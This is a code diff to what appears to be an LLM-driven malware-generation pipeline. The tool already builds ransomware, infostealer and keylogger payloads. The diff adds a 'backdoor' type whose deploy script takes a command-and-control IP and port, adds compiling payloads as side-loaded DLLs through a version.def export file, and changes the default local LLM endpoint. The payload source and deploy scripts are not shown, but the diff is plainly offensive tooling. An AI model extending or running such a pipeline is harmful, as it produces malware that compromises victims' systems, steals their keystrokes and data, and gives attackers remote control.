@@ -69,7 +69,7 @@ async def cmd_generate(args) -> int:
     # Early validation — malware_type must be explicitly set in spec.yaml
     target_spec = parse_target_spec(spec_path=args.spec)
     if not target_spec.malware_type or target_spec.malware_type in ("exe", "elf"):
-        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger'.")
+        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger', 'backdoor'.")
         return 1
 
     pipeline = MalwarePipeline(
@@ -189,7 +189,7 @@ async def cmd_verify(args) -> int:
     # Early validation — malware_type must be explicitly set in spec.yaml
     target_spec = parse_target_spec(spec_path=args.spec)
     if not target_spec.malware_type or target_spec.malware_type in ("exe", "elf"):
-        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger'.")
+        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger', 'backdoor'.")
         return 1
 
     _use_existing = getattr(args, "use_existing_vm", False)
@@ -278,7 +278,7 @@ async def cmd_run(args) -> int:
     # Early validation — malware_type must be explicitly set in spec.yaml
     target_spec = parse_target_spec(spec_path=args.spec)
     if not target_spec.malware_type or target_spec.malware_type in ("exe", "elf"):
-        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger'.")
+        print("ERROR: malware_type not set in spec.yaml. Set it to e.g. 'ransomware', 'infostealer', 'keylogger', 'backdoor'.")
         return 1
 
     _use_existing = getattr(args, "use_existing_vm", False)
@@ -511,6 +511,10 @@ async def cmd_chunk(args) -> int:
         deploy_script = Path(__file__).parent / "scripts" / "deploy_keylogger.sh"
         if deploy_script.exists():
             shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
+    elif malware_type == "backdoor":
+        deploy_script = Path(__file__).parent / "scripts" / "deploy_backdoor.sh"
+        if deploy_script.exists():
+            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
 
     build_info = (
         f"type: {malware_type}\n"
@@ -522,8 +526,18 @@ async def cmd_chunk(args) -> int:
 
     exe_out = None
     if args.compile:
-        exe_out = pkg_dir / "payload.exe"
-        ok = compile_mingw(str(src_out), str(exe_out))
+        import yaml as _yaml
+        with open(recipe_path) as _rf:
+            _recipe_data = _yaml.safe_load(_rf)
+        _arch = _recipe_data.get("arch", "")
+        if _arch == "arch/dll_sideload":
+            exe_out = pkg_dir / "payload.dll"
+            _def_name = _recipe_data.get("def_file", "version.def")
+            _def_path = str(Path(__file__).parent / "templates" / "chunks" / "arch" / _def_name)
+            ok = compile_mingw(str(src_out), str(exe_out), dll_def=_def_path)
+        else:
+            exe_out = pkg_dir / "payload.exe"
+            ok = compile_mingw(str(src_out), str(exe_out))
         if not ok:
             return 1
         build_info += f"binary_size: {exe_out.stat().st_size}\n"
@@ -537,6 +551,8 @@ async def cmd_chunk(args) -> int:
         scripts_dir = Path(__file__).parent / "scripts"
         if malware_type == "keylogger":
             test_script = scripts_dir / "deploy_keylogger.sh"
+        elif malware_type == "backdoor":
+            test_script = scripts_dir / "deploy_backdoor.sh"
         else:
             test_script = scripts_dir / "test_template.sh"
         if not test_script.exists():
@@ -547,6 +563,8 @@ async def cmd_chunk(args) -> int:
             test_env["C2_RESULTS_DIR"] = str(pkg_dir)
             if malware_type == "keylogger":
                 cmd = ["bash", str(test_script), test_input, c2_port]
+            elif malware_type == "backdoor":
+                cmd = ["bash", str(test_script), test_input, c2_ip, c2_port]
             else:
                 cmd = ["bash", str(test_script)]
                 if args.snapshot:
@@ -648,7 +666,7 @@ def build_parser() -> argparse.ArgumentParser:
     )
     gen_parser.add_argument(
         "--llm-url", default="",
-        help="Local LLM API base URL (default: http://localhost:1234). Use to point at a remote LM Studio endpoint.",
+        help="Local LLM API base URL (default: http://localhost:11235). Use to point at a remote LM Studio endpoint.",
     )
     gen_parser.add_argument(
         "--llm-model", default="",
@@ -710,7 +728,7 @@ def build_parser() -> argparse.ArgumentParser:
     )
     ver_parser.add_argument(
         "--llm-url", default="",
-        help="Local LLM API base URL (default: http://localhost:1234).",
+        help="Local LLM API base URL (default: http://localhost:11235).",
     )
     ver_parser.add_argument(
         "--llm-model", default="",
@@ -769,7 +787,7 @@ def build_parser() -> argparse.ArgumentParser:
     )
     run_parser.add_argument(
         "--llm-url", default="",
-        help="Local LLM API base URL (default: http://localhost:1234). Use to point at a remote LM Studio endpoint.",
+        help="Local LLM API base URL (default: http://localhost:11235). Use to point at a remote LM Studio endpoint.",
     )
     run_parser.add_argument(
         "--llm-model", default="",
